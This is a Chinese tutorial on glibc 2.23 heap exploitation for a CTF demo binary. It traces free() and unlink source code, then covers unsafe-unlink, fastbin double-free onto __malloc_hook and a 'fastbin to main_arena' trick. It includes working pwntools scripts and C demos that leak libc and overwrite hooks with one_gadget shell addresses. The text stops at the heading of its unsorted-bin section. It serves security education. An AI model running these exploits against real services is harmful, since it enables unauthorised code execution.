> 环境：glibc2.23
>
> 文件：利用[demo](https://raw.githubusercontent.com/fangdada/ctf/master/how2pwn/unsorted-bin/demo)



[TOC]



## unsafe-unlink

&emsp;&emsp;<font size=2>看到这了我就假设你已经看过我的malloc四部曲和free了，接下来我们将利用这些利用技巧来更深层次的理解内存管理。首先还是从简单的入手，假设有如下代码：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
        void *p1,*p2;

        p1=malloc(0x100);
        p2=malloc(0x100);
        malloc(0x20);

        free(p1);
        free(p2);

        return 0;
}

```

&emsp;&emsp;<font size=2>为什么要`malloc(0x20);`？之前我们分析过，如果下一个堆块是top，那么free这个p2的时候就会发生和top堆合并的情况，但我们不让这种情况发生，所以随便垫一个堆块上去隔离掉top。malloc的情况我们已经分析过了，还记得`goto use_top;`吗？所以我们直接看在堆块不靠着top的情况下`free(p1);`发生了什么：</font></br>

```C
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      //...
    }

  if (mem == 0)                              /* free(0) has no effect */
    return;

  p = mem2chunk (mem);

  if (chunk_is_mmapped (p))                       /* release mmapped memory. */
    {
      /* see if the dynamic brk/mmap threshold needs adjusting */
      //...
    }

  ar_ptr = arena_for_chunk (p);
  _int_free (ar_ptr, p, 0);
}

```

&emsp;&emsp;<font size=2>调用\_int_free，很熟悉，ar_ptr为main_arena，p指向了chunk头，看_int_free，跳过一些重复分析过的东西，控制流到了这里：</font></br>

```C
    /* consolidate backward */
    if (!prev_inuse(p)) {
      //...
    }

    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
        //...
      } else
        clear_inuse_bit_at_offset(nextchunk, 0);
```

&emsp;&emsp;<font size=2>显然我们free的堆块是堆区最上面的第一个堆块，因此prev_inuse不可能为0，也就不可能consolidate backward了。然后检查了nextchunk是不是top chunk，在我们的情况下不是，因此进入第二个if中执行，相关宏定义如下：</font></br>

```C
#define inuse_bit_at_offset(p, s)                                             \
  (((mchunkptr) (((char *) (p)) + (s)))->size & PREV_INUSE)
#define clear_inuse_bit_at_offset(p, s)                                       \
  (((mchunkptr) (((char *) (p)) + (s)))->size &= ~(PREV_INUSE))
#define PREV_INUSE 0x1
```

&emsp;&emsp;<font size=2>nextinuse就是0x20堆块的prev_inuse位，显然为1，因此不满足if条件，进入到了else，情况了nextchunk（第二个0x100堆块）的prev_inuse位，size变为了0x110。继续往下看：</font></br>

```C
#define set_head(p, s)       ((p)->size = (s))
#define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))->prev_size = (s))

      /*
        Place the chunk in unsorted chunk list. Chunks are
        not placed into regular bins until after they have
        been given one chance to be used in malloc.
      */

      bck = unsorted_chunks(av);
      fwd = bck->fd;
      if (__glibc_unlikely (fwd->bk != bck))
        {
          errstr = "free(): corrupted unsorted chunks";
          goto errout;
        }
      p->fd = fwd;
      p->bk = bck;
      if (!in_smallbin_range(size))
        {
          //...
        }
      bck->fd = p;
      fwd->bk = p;

      set_head(p, size | PREV_INUSE);
      set_foot(p, size);

      check_free_chunk(av, p);
    }
    else {
      //...
    }
```

&emsp;&emsp;<font size=2>先检查unsorted bin链表状态，相当于`bin->fd->bk==bin`。然后在p（我们释放的堆块）的fd和bk地址处放上unsotedbin的fd和bk处的值，第一次释放的话就是unsortedbin在main_arena的地址，设置完了后main_arena中的unsortedbin的fd和bk也要修改为p的地址。因为这个堆块的释放，下一个堆块的pre_size就得设置为此堆块的大小以备下次合并的时候读取用。这一系列操作结束后堆块情况如下：</font></br>

```
pwndbg> x/20xg 0x602000
0x602000:	0x0000000000000000	0x0000000000000111
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000000
pwndbg>
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000000000
0x6020e0:	0x0000000000000000	0x0000000000000000
0x6020f0:	0x0000000000000000	0x0000000000000000
0x602100:	0x0000000000000000	0x0000000000000000
0x602110:	0x0000000000000110	0x0000000000000110
0x602120:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x0000000000000000
pwndbg> p main_arena
$2 = {
  mutex = 0,
  flags = 1,
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  top = 0x602250,
  last_remainder = 0x0,
  bins = {0x602000, 0x602000, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1be8 <main_arena+200>...},
  binmap = {0, 0, 0, 0},
  next = 0x7ffff7dd1b20 <main_arena>,
  next_free = 0x0,
  attached_threads = 1,
  system_mem = 135168,
  max_system_mem = 135168
}
pwndbg> x/20xg & main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602250
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x0000000000602000
0x7ffff7dd1b90 <main_arena+112>:	0x0000000000602000	0x00007ffff7dd1b88
0x7ffff7dd1ba0 <main_arena+128>:	0x00007ffff7dd1b88	0x00007ffff7dd1b98
0x7ffff7dd1bb0 <main_arena+144>:	0x00007ffff7dd1b98	0x00007ffff7dd1ba8
pwndbg>

```

&emsp;&emsp;<font size=2>因此与合并到top不同的是，这一次会设置p和main_arena的fd和bk，还会设置下一个堆块的prev_inuse标志位和pre_size。</font></br>

&emsp;&emsp;<font size=2>分析完了第一个free之后我们来分析第二个free，这个才是重点，与之前不同的是，控制流会到达这里：</font></br>

```C
#define prev_inuse(p)       ((p)->size & PREV_INUSE)
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))

    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
```

&emsp;&emsp;<font size=2>此时size为两个将被合并的堆块的size之和，p被设置到了上一个堆块，也就是准备unlink合并的堆块，而unlink就是最关键的一个宏，也是本节的核心：</font></br>

```C
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;                                                               \
    BK = P->bk;                                                               \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {                                                                    \
        FD->bk = BK;                                                          \
        BK->fd = FD;                                                          \
        if (!in_smallbin_range (P->size)                                      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {                \
            //...                                                            \
          }                                                                   \
      }                                                                       \
}

```

&emsp;&emsp;<font size=2>第一个被释放的smallbin P是unsortedbin list中唯一一个堆块，其fd和bk为unsortedbin在main_arena的地址，被赋给了FD和BK。然后对这个unsortedbin list有一个检查。按照我们之前分析的，FD->bk和BK->fd都为P的地址，因此检查不会触发错误，继续往下看，又重新将unsotedbin list中的fd和bk置位为了其在main_arena地址，然后unlink宏就结束了。其相当于执行了：</font></br>

```C
P->fd->bk=P->bk;
P->bk->fd=P->fd;
//非常经典的链表脱钩算法，记住这一个操作！
```

&emsp;&emsp;<font size=2>完成unlink后的main_arena状态如下（但还没结束！），可以看到(main_arena+88)处的fd，bk被更改了：</font></br>

```
pwndbg> p main_arena
$5 = {
  mutex = 1,
  flags = 1,
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  top = 0x602250,
  last_remainder = 0x0,
  bins = {0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1be8 <main_arena+200>...},
```

&emsp;&emsp;<font size=2>_int_free剩下的代码就比较简单：</font></br>

```C
    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
        //...
      } else
        clear_inuse_bit_at_offset(nextchunk, 0);

      bck = unsorted_chunks(av);
      fwd = bck->fd;
      if (__glibc_unlikely (fwd->bk != bck))
        {
          errstr = "free(): corrupted unsorted chunks";
          goto errout;
        }
      p->fd = fwd;
      p->bk = bck;
      if (!in_smallbin_range(size))
        {
          p->fd_nextsize = NULL;
          p->bk_nextsize = NULL;
        }
      bck->fd = p;
      fwd->bk = p;

      set_head(p, size | PREV_INUSE);
      set_foot(p, size);

      check_free_chunk(av, p);
    }
```

&emsp;&emsp;<font size=2>清空了被free堆块下一个堆块的prev_inuse位，然后bck为main_arena的地址，fwd也是main_arena的地址。把被释放指针的fd和bk设置为了main_arena地址，又把main_arena中unsortedbin list的bk和fd设置为了p的地址，然后重新设置p堆块的size和下一个堆块的pre_size。最终效果如下：</font></br>

```
pwndbg> p main_arena
$6 = {
  mutex = 0,
  flags = 1,
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  top = 0x602250,
  last_remainder = 0x0,
  bins = {0x602000, 0x602000, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1be8 <main_arena+200>...},


pwndbg> x/20xg 0x602000
0x602000:	0x0000000000000000	0x0000000000000221
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
..........
..........
0x602220:	0x0000000000000220	0x0000000000000030
0x602230:	0x0000000000000000	0x0000000000000000
0x602240:	0x0000000000000000	0x0000000000000000
0x602250:	0x0000000000000000	0x0000000000020db1
0x602260:	0x0000000000000000	0x0000000000000000
```

&emsp;&emsp;<font size=2>那么对这个demo的分析完成了，接下来就直接看看unsafe-unlink是怎么利用这个unlink宏达到攻击效果的吧。看如下demo代码：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>

unsigned long chunk_link[0x10];

int main()
{
	void *p1,*p2;
	unsigned long* ptr;

	p1=malloc(0x100);
	p2=malloc(0x100);
	malloc(0x20);

  //记录这些堆块
	chunk_link[0]=p1;
	chunk_link[1]=p2;

  //伪造fd和bk
	ptr=(unsigned long*)p1;
	*(ptr+2)=(unsigned long)&chunk_link[0]-0x18;
	*(ptr+3)=(unsigned long)&chunk_link[0]-0x10;

  //伪造pre_size并抹掉prev_inuse位
	ptr=(unsigned long*)p2;
	*(ptr-2)=0x100;
	*(ptr-1)=0x110;
  //unlink修改了chunk_link记录的堆块指针
	free(p2);

  //任意地址写
	read(0,chunk_link[0],0x20);
	read(0,chunk_link[0],0x20);

	return 0;
}
```

&emsp;&emsp;<font size=2>这是一段模拟了unsafe-unlink攻击导致可以任意地址写的代码，假如有一个读书笔记模拟程序，该程序可能通过malloc分配的堆块记录你写的笔记，然后你可以对你之前写的笔记重新进行修改（相当于之前分配的堆块），那么可能就会有一个全局变量保存了每个堆块的地址以方便下次进行写入读取。接下来我们开始我们的正片，伪造fd，bk后再伪造下一个堆块的pre_size和prev_inuse位！然后我们将跟踪`free(p2);`这个函数来分析unsafe-unlink是如何发生的，老样子，直接从_int_free的核心代码开始看起：</font></br>

```C
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
```

&emsp;&emsp;<font size=2>因为我们在`free(p2);`之前已经通过某种手段抹掉了其prev_inuse位，因此控制流会进入这一段if执行，得到其pre_size，并把其加到size上，然后设置p减去我们伪造的pre_size而到了一个假的，不是真正的堆块上，然后进行一个unlink宏：</font></br>

```C
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;                                                               \
    BK = P->bk;                                                               \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {                                                                    \
        FD->bk = BK;                                                          \
        BK->fd = FD;
```

&emsp;&emsp;<font size=2>现在宏内部，P就是那个假的堆块（现在称其为我们伪造的堆块），唯一需要注意的就是对这个链表的一个检查：`FD->bk!=P || BK->fd!=P`，FD就是`P+0x10`的数据，我们伪造为了`&chunk_link[0]-0x18`，BK就是`P+0x18`里的数据，我们伪造为了`&chunk_link[0]-0x10`，而对其bk或者fd的访问同样也是一个加0x18或者0x10的偏移，因此想象一下这个检查：</font></br>

```C
*((&chunk_link[0]-0x18)+0x18)==P
*((&chunk_link[0]-0x10)+0x10)==P
```

&emsp;&emsp;<font size=2>效果岂不是相当于`chunk_link[0]==P`？而chunk_link[0]正是我们之前记录的堆块P（思考一下，为什么只能把堆块伪造在堆块头+0x10的位置，再往下就不行？），检查刚好被绕过了，然后再看一看我们之前分析得到的链表脱钩操作：</font></br>

```C
P->fd->bk=P->bk;
P->bk->fd=P->fd;
```

&emsp;&emsp;<font size=2>这个操作的效果如下：</font></br>

```C
chunk_link[0]=p-0x10;
chunk_link[0]=p-0x18;
```

&emsp;&emsp;<font size=2>free的后续代码不重要了，也就是说free函数结束后，chunk_link的内容变成了这样：</font></br>

```
0x601080 <chunk_link>:	0x0000000000601068	0x0000000000602120
0x601090 <chunk_link+16>:	0x0000000000000000	0x0000000000000000
```

&emsp;&emsp;<font size=2>这个时候，程序还以为`chunk_link[0]`记录的仍然是第一个堆块的地址，然后其指向的地址却已修改为了chunk_link地址的前0x18个字节，因此在你使用"编辑以前的笔记"功能的时候，效果类似如下：</font></br>

```C
read(0,chunk_link[0],0x20);
```

&emsp;&emsp;<font size=2>往里写入一系列数据的时候会覆盖到我们的chunk_link，相当于chunk_link里有多少个堆块我们就可以任意写多少次。比如写0x20个'a'：</font></br>

```
pwndbg> x/20xg 0x601000
0x601000:	0x0000000000600e28	0x00007ffff7ffe168
0x601010:	0x00007ffff7dee870	0x00007ffff7a914f0
0x601020:	0x00007ffff7b04250	0x00007ffff7a2d740
0x601030:	0x00007ffff7a91130	0x0000000000000000
0x601040:	0x0000000000000000	0x0000000000000000
0x601050:	0x0000000000000000	0x0000000000000000
0x601060 <completed.7594>:	0x0000000000000000	0x6161616161616161
0x601070:	0x6161616161616161	0x6161616161616161
0x601080 <chunk_link>:	0x6161616161616161	0x0000000000602120
0x601090 <chunk_link+16>:	0x0000000000000000	0x0000000000000000
pwndbg>
```

&emsp;&emsp;<font size=2>再次使用"重新编辑笔记功能"，效果就等同于向0x6161616161616161地址处写入任意数据了，如果这个不是0x6161616161616161而是一些敏感的地址呢？比如\_\_malloc_hook？比如got表？getshell就变得非常简单了:D</font></br>

&emsp;&emsp;<font size=2>`unsafe-unlink`的套路大多如此，一般都是直接打记录堆地址的全局变量数组了，所以没有啥另外的甜品技术。所以直接用这个技术打我们的漏洞大礼包程序来试试getshell吧，利用pwntools脚本如下：</font></br>

```python
from pwn import *

p=process('./demo')

context.log_level=1

sd=lambda x: p.send(x)
sl=lambda x: p.sendline(x)
rv=lambda x: p.recvuntil(x)
sa=lambda a,x: p.sendafter(a,x)
sla=lambda a,x: p.sendlineafter(a,x)

menu='Choice:'

def add(size,content=''):
    sla(menu,'1')
    sla('input your size:',str(size))
    sla('input your message:',content)

def delete(index):
    sla(menu,'2')
    sla('input the index: ',str(index))

def edit(index,content):
    sla(menu,'3')
    sla('input the index: ',str(index))
    sla('input your content:',content)

def show(index):
    sla(menu,'4')
    sla('input the index: ',str(index))

chunk_link=0x6020c0

#=========================
# leak libc_base

add(0x100)
add(0x100)
delete(0)
show(0)
rv('content:')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b78
success("libc base:"+hex(libc_base))
delete(1)

#===================================
# now exploit
add(0x100)      #2
add(0x100)      #3
add(0x20)       #4

# fake the fd and bk to chunk_link
payload=p64(0)*2+p64(chunk_link-0x18)+p64(chunk_link-0x10)
payload=payload.ljust(0x100,'a')

#edit nextchunk's pre_size and prev_inuse
payload+=p64(0x100)+p64(0x110)
edit(2,payload)

delete(3)
edit(0,'a'*0x18+p64(libc_base+0x3c67a8))
edit(0,p64(libc_base+0x4526A))
#gdb.attach(p)

delete(4)

p.interactive()


'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

```

## double-free

&emsp;&emsp;<font size=2>老样子首先从一个demo程序开始看起：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
        void *p1,*p2,*p3;
        unsigned long* ptr;

        p1=malloc(0x50);
        p2=malloc(0x50);
        ptr=(unsigned long*)p1;

        free(p1);
        free(p2);
        free(p1);

  			//从这里开始分析
        malloc(0x50);
  			//伪造fd指针
        *ptr=0x61616161;

        malloc(0x50);
        malloc(0x50);
        malloc(0x50);

        return 0;
}
```

&emsp;&emsp;<font size=2>因为已经对malloc的原理有过分析了，而free的原理也对fastbin有过分析了，对free的结果其实我们也能推测出来了（fastbinY记录的是最后一个被free的fastbin地址），如果不相信的话我们可以看一下main_arena：</font></br>

```
pwndbg> p main_arena
$1 = {
  mutex = 0,
  flags = 0,
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x602000, 0x0, 0x0, 0x0, 0x0, 0x0},
  top = 0x6020c0,
  last_remainder = 0x0,
  bins = {0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1be8 <main_arena+200>...},
```

&emsp;&emsp;<font size=2>被free的堆块会在其fd处放上fastbinY里的内容（在fastbinY被修改前，这样的效果是记录旧的堆块，正好将堆块串联起来形成单链表）。所以三次free之后堆块内容如下（注意这是double free！p2后再次free p1时p1的fd会被记录为p2）：</font></br>

```
pwndbg> x/20xg 0x602000
0x602000:	0x0000000000000000	0x0000000000000061
0x602010:	0x0000000000602060	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000061
0x602070:	0x0000000000602000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000000
pwndbg>
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000000000	0x0000000000020f41
0x6020d0:	0x0000000000000000	0x0000000000000000
```

&emsp;&emsp;<font size=2>这些都是我们预料之中的，所以我们直接从free之后的malloc开始分析，同样的重复分析过的跳过，直接从_int_malloc开始看：</font></br>

```C
/* offset 2 to use otherwise unindexable first 2 bins */
#define fastbin_index(sz) \
  ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)


   /*
     If the size qualifies as a fastbin, first check corresponding bin.
     This code is safe to execute even if av is not yet initialized, so we
     can try it without checking, which saves some time on this fast path.
   */

  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp = *fb;
      do
        {
          victim = pp;
          if (victim == NULL)
            break;
        }
      while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
             != victim);
      if (victim != 0)
        {
          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
            {
              errstr = "malloc(): memory corruption (fast)";
            errout:
              malloc_printerr (check_action, errstr, chunk2mem (victim), av);
              return NULL;
            }
          check_remalloced_chunk (av, victim, nb);
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }

```

&emsp;&emsp;<font size=2>显然控制流会进入这里，根据我们申请的size，获取fastbinY里的堆块，然后会定义一个pp获取fastbin的fd处的地址（取单链表的下一个地址，换句话说就是在这个堆块之前被free的堆块，如果是0就说明这是第一个被free的，但在我们的情况下被修改为了任意值0x61616161，显然这是个非法的堆块地址，因此访问这个非法地址的“fd”处时会触发内存错误），后面再把fastbinY里的值更新为链表的下一个节点，也就是pp的值。</font></br>

&emsp;&emsp;<font size=2>不过注意这个`fastbin_index(chunksize(victim))!=idx`判断，思考一下，如果我们之前伪造的fd指向的是一个合法的地址（比如说指向另一个堆块），那么在更新fastbinY的时候就不会触发内存错误，控制流会继续往下到了`fastbin(chunksize(victim))!=idx`这里，在我们的情况下idx为4（由`(0x60>>4)-2`计算得到），victim的size假如是0x80，那么`(0x80>>4)-2`为6，那么就被检查出错误来了，就会发生malloc corruption，那么为了不崩溃，我们伪造的fd指向的地址处的size偏移处（p+0x8）的8字节数据必须和我们申请的相当。假如我们`malloc(0x50);`，那么nb就是0x60，那么伪造的fd的size处必须为0x60~0x6F，因为这样经过计算idx才相等，才能绕过检查。</font></br>

&emsp;&emsp;<font size=2>还记得上一节我们利用unsafe-unlink修改\_\_free_hook吗？这一次我们修改\_\_malloc_hook，利用他们getshell的原理都是一样的（修改他们的地址为libc中的one_gadget地址，一步到位），接下来展示一种利用fastbin to libc的技巧：</font></br>

```
pwndbg> x/20xg  0x7ffff7dd1b10-0x40
0x7ffff7dd1ad0 <_IO_wide_data_0+272>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1ae0 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1af0 <_IO_wide_data_0+304>:	0x00007ffff7dd0260	0x0000000000000000
0x7ffff7dd1b00 <__memalign_hook>:	0x00007ffff7a92e20	0x00007ffff7a92a00
0x7ffff7dd1b10 <__malloc_hook>:	0x00007ffff7a92830	0x0000000000000000
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
```

&emsp;&emsp;<font size=2>如上所示，我们攻击的目标是\_\_malloc_hook，我们要把fastbin分配到这上面去！</font></br>

> 等等？你不是说伪造的fd的size偏移处的数据要跟我们申请的size相当吗？分配到\_\_malloc_hook上size岂不是要0x00007ffff7a92a00这么大？

&emsp;&emsp;<font size=2>是的，的确没错，但是我们不一定要把堆块直直的分配在hook的正上方，思路猥琐一点，如果这样看\_\_malloc_hook周围的数据：</font></br>

```
pwndbg> x/20xg 0x7ffff7dd1aed
0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
0x7ffff7dd1afd:	0xfff7a92e20000000	0xfff7a92a0000007f
0x7ffff7dd1b0d <__realloc_hook+5>:	0xfff7a9283000007f	0x000000000000007f
0x7ffff7dd1b1d:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b2d <main_arena+13>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b3d <main_arena+29>:	0x0000000000000000	0x0000000000000000
```

&emsp;&emsp;<font size=2>这里不是有一个0x7F吗（滑稽）？也就是说我们把fd伪造为0x7ffff7dd1aed就可以绕过idx检查了，然后往下随意写19个字节，再把one_gadget的8字节写上去就刚好覆盖\_\_malloc_hook了。思路有了，我就直接放demo的pwntools利用了：</font></br>

```python
from pwn import *

p=process('./demo')

context.log_level=1

sd=lambda x: p.send(x)
sl=lambda x: p.sendline(x)
rv=lambda x: p.recvuntil(x)
sa=lambda a,x: p.sendafter(a,x)
sla=lambda a,x: p.sendlineafter(a,x)

menu='Choice:'

def add(size,content=''):
    sla(menu,'1')
    sla('input your size:',str(size))
    sla('input your message:',content)

def delete(index):
    sla(menu,'2')
    sla('input the index: ',str(index))

def edit(index,content):
    sla(menu,'3')
    sla('input the index: ',str(index))
    sla('input your content:',content)

def show(index):
    sla(menu,'4')
    sla('input the index: ',str(index))

chunk_link=0x6020c0

#=========================
# leak libc_base

add(0x100)
add(0x100)
delete(0)
show(0)
rv('content:')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b78
success("libc base:"+hex(libc_base))
delete(1)

#===================================
# now exploit
add(0x68)      #2
add(0x68)      #3
add(0x68)      #4 avoid chunk count overflow to 0xFFFF....

# double free
delete(2)
delete(3)
delete(2)

# fake the fd to __malloc_hook
add(0x68,p64(libc_base+0x3c4aed))
add(0x68)
add(0x68)
# rewrite to one_gadget
add(0x68,'a'*0x13+p64(libc_base+0x4526a))
#gdb.attach(p)

add(0x233)
p.interactive()


'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

```

***

#### fastbin to main_arena

&emsp;&emsp;<font size=2>在这里额外介绍一个新的利用double free改写任意地址的技巧：fastbin to main_arena。就是把fastbin分配到main_arena上去，然后就可以修改main_arena上的数据达到我们的目的，比如说我们可以修改top堆块到任何位置（只要满足size检查），然后相当于就可以在任何地方分配堆块，进而可以修改任何地址的数据，不多说，demo放在下面，原理上面都已经分析过了：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
	void *p1,*p2,*p3;
	unsigned long* ptr;

	p1=malloc(0x100);
	p2=malloc(0x100);
	free(p1);
	unsigned long libc_base=*(unsigned long*)p1-0x3c4b78;
	free(p2);
	//fprintf(stderr,"libc base:%llx\n",libc_base);

	p1=malloc(0x50);
	p2=malloc(0x50);

	p3=malloc(0x30);
	free(p3);
	ptr=(unsigned long*)p3;

  // edit fastbin fd
	*ptr=0x60;
  // 0x60 in fastbinY
	malloc(0x30);

	free(p1);
	free(p2);
	free(p1);

	malloc(0x50);
	ptr=(unsigned long*)p1;
  // edit fd to fastbinY where lays 0x60 we put on
	*ptr=libc_base+0x3c4b30;
	malloc(0x50);
	malloc(0x50);

	//chunk in the main_arena
	p1=malloc(0x50);

	// edit the top chunk
	ptr=(unsigned long*)p1;
	*(ptr+7)=libc_base+0x3c4b00;

	// chunk on the __malloc_hook
	p2=malloc(0x100);

	//edit the __malloc_hook with one_gadget
	ptr=(unsigned long*)p2;
	*ptr=libc_base+0x4526A;

	// getshell
	malloc(0x100);

	return 0;
}

/*
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
*/
```

## unsorted-bin attack

